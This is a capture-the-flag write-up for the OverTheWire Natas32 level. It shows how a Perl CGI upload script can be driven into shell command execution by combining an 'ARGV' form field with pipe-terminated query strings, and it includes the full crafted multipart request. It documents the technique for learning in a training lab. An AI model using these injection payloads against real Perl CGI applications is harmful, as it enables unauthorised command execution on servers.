# Natas32 → Natas33 Writeup (OverTheWire)

**Goal:** Achieve code execution and run a binary called `getpassword` sitting in the webroot to obtain the password for `natas33`.
**Tools used:** Burp Suite, Browser


## 1. Recon

Natas32 is the same "CSV2HTML" tool as natas31, with one line added to the page text:

> "This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute."

The provided `index.pl` source is functionally identical to natas31's:

```perl
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;
        ...
    }
    print '</table>';
}
```

So the same underlying primitive from natas31 is still here: `$file` is taken from a `file`-named parameter in scalar context, then used directly as a filehandle in `while (<$file>)`. If `$file` holds the string `"ARGV"`, Perl reads from `@ARGV` via the special `<ARGV>` diamond operator.

The difference this time is the goal: instead of just *reading* a file, we need *code execution* to run the `getpassword` binary.

## 2. From arbitrary file read to code execution

This is where a second, classic Perl quirk comes in: Perl's `open()` (and by extension the implicit opens performed by `<ARGV>`) treats a filename that **ends with a pipe character `|`** as a command to execute, not a file to read. Perl runs the command in a shell and lets you read its *output* through the filehandle, exactly as if it were file content.

So if we can get `@ARGV` to contain a string like:

```
ls . |
```

then `<ARGV>` won't try to open a file called `ls . `; it will run `ls .` as a shell command and stream its output back into our loop which then gets rendered straight into the HTML table.

Just like in the natas31 writeup, `@ARGV` gets populated by `CGI.pm`'s legacy behavior: a query string with no `=` sign is treated as a keyword list and stashed into `@ARGV`. So the query string itself becomes our command.

## 3. Building the request in Burp Suite

1. Create a dummy CSV file (content doesn't matter)

2. With Burp proxying the browser, upload this file at `http://natas32.natas.labs.overthewire.org/`.

3. In **Proxy → HTTP history**, find the `POST /index.pl` request, right-click and **Send to Repeater**.

4. Duplicate the `file` form-data part exactly as in the natas31 trick add a plain-text `file` field with the value `ARGV` before the real upload part:

   ```
   ------WebKitFormBoundaryTX9zt4boIRWyKl5P
   Content-Disposition: form-data; name="file"
   Content-Type: text/plain

   ARGV
   ------WebKitFormBoundaryTX9zt4boIRWyKl5P
   Content-Disposition: form-data; name="file"; filename="test.csv"
   Content-Type: text/csv

   1,2,
   3,4,
   ------WebKitFormBoundaryTX9zt4boIRWyKl5P
   Content-Disposition: form-data; name="submit"

   Upload
   ------WebKitFormBoundaryTX9zt4boIRWyKl5P--
   ```

5. Set the query string on `/index.pl` to a command ending in a pipe, URL-encoded (spaces become `%20`). First, to confirm code exec and see what's in the webroot:

   ```
   POST /index.pl?ls%20.%20| HTTP/1.1
   ```

   (Plain `ls` without the trailing `.` doesn't behave the same way here, include it.)

## 4. Confirming code execution

Sending the request above returns an HTML table where each "row" is a line of `ls .` output:

```
bootstrap-3.3.6-dist
getpassword
index-source.html
index.pl
jquery-1.12.3.min.js
sorttable.js
tmp
```

This confirms arbitrary command execution and reveals the target binary: `getpassword`.

## 5. Running `getpassword`

Update the query string to execute that binary instead:

```
POST /index.pl?./getpassword%20| HTTP/1.1
```

Full request:

```
POST /index.pl?./getpassword%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
Content-Length: <auto>
Cache-Control: max-age=0
Authorization: Basic <natas32 credentials, base64>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTX9zt4boIRWyKl5P
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://natas32.natas.labs.overthewire.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://natas32.natas.labs.overthewire.org/
Connection: keep-alive

------WebKitFormBoundaryTX9zt4boIRWyKl5P
Content-Disposition: form-data; name="file"
Content-Type: text/plain

ARGV
------WebKitFormBoundaryTX9zt4boIRWyKl5P
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

1,2,
3,4,
------WebKitFormBoundaryTX9zt4boIRWyKl5P
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundaryTX9zt4boIRWyKl5P--
```

## 6. Result

The response's HTML table now contains the output of the `getpassword` binary,  the password for `natas33` rendered as table rows just like the `ls` output was.